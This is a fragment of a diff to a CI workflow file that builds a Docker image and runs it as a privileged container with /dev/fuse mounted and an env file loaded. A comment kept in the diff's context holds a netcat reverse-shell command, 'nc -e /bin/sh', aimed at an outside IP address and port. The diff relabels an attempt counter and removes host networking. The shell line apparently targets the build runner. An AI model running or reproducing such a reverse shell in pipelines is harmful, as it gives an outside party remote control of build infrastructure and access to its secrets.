@@ -55,12 +55,16 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # NORMALISACION 2
+          # INTENTO 20
           
-        
+ 
+          
+
+
+
+    
           docker build -t app-grupo-${{secrets.GROUP_ID}} .
           docker run -d --privileged \
-            --network=host \  
             -v /dev/fuse:/dev/fuse \
             --env-file .env \
             --network net4104 \
